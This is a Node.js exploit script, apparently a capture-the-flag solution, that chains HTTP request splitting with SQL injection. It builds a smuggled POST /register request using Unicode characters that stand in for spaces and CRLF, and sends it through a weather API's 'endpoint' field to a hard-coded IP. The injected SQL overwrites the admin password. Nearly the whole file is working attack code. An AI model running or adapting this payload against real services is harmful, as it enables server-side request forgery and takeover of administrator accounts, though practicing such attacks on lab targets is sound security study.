const fetch = require('node-fetch');

// add the space, /r and /n and /rn parameters, the format is /u{hex}
const s = '\u{0120}'
const r = '\u{010D}'
const n = '\u{010A}'
const rn = r + n
const sq = '%27'
const dq = '%22'
/* the password SQLi query
INSERT INTO users(username,password) VALUES ('admin','test') ON CONFLICT (username) DO UPDATE SET password = 'test';
*/

let username = "admin"
let password = "test')" + s + 'ON' + s + 'CONFLICT' + s + '(username)' + s + 'DO' + s + 'UPDATE' + s + 'SET' + s + 'password' + s + '=' + s + "%27test123%27;--"
username = username.replace(' ',s).replace('"',dq).replace("'",sq)
password = password.replace(' ',s).replace('"',dq).replace("'",sq)


let contentLength = username.length + password.length + 19
//Construct the payload url
const ip = "127.0.0.1/"
const httpTag = 'HTTP/1.1'
const postTag = "POST" + s + "/register"
const hostHeader = "Host:" + s + '127.0.0.1:1337'
const contentLengthHeader = "Content-Length:" + s + contentLength.toString() //change to length of username and paswword payload
const cacheControl = "Cache-Control:" + s + 'max-age=0'
const upgradeInsecureRequests = "Upgrade-Insecure-Requests:" + s + '1'
const origin = "Origin:" + s + 'http://127.0.0.1:1337'
const contentType = "Content-Type:" + s + 'application/x-www-form-urlencoded'
const userAgent = "User-Agent:" + s + 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
const accept = "Accept:" + s + 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
const referer = "Referer:" + s + 'http://127.0.0.1:1337/register'
const acceptEncoding = "Accept-Encoding:" + s + 'gzip, deflate'
const acceptLanguage = "Accept-Language:" + s + 'en-GB,en-US;q=0.9,en;q=0.8'
const connection = "Connection:" + s + 'close' 


const payloadUrl = `${ip}${s}${httpTag}${rn}${rn}${postTag}${s}${httpTag}${rn}${hostHeader}${rn}${contentLengthHeader}${rn}${cacheControl}${rn}${upgradeInsecureRequests}${rn}${origin}${rn}${contentType}${rn}${userAgent}${rn}${accept}${rn}${referer}${rn}${acceptEncoding}${rn}${acceptLanguage}${rn}${connection}${rn}${rn}username=${username}&password=${password}${rn}${rn}GET${s}`;
//the above is same as :const payloadUrl = ip+s+httpTag+rn+rn+postTag+s+httpTag+rn+hostHeader+rn+contentLengthHeader+rn+cacheControl+rn+upgradeInsecureRequests+rn+origin+rn+contentType+rn+userAgent+rn+accept+rn+referer+rn+acceptEncoding+rn+acceptLanguage+rn+connection+rn+rn+"username="+username+"&password="+password+rn+rn+"GET"+s;
const postData = JSON.stringify({
  "endpoint":payloadUrl,
  "city":"Abuja",
  "country":"NG"
});

const options = {
  method: 'POST',
  headers: {
    'Host': '104.248.175.144:32740',
    'Content-Length': '67', //change this
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'http://104.248.175.144:32740',
    'Referer': 'http://104.248.175.144:32740/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'close'
  },
  body: postData,
};


fetch('http://104.248.175.144:32740/api/weather', options)
  .then((res) => res.json())
  .then((json) => console.log(json));
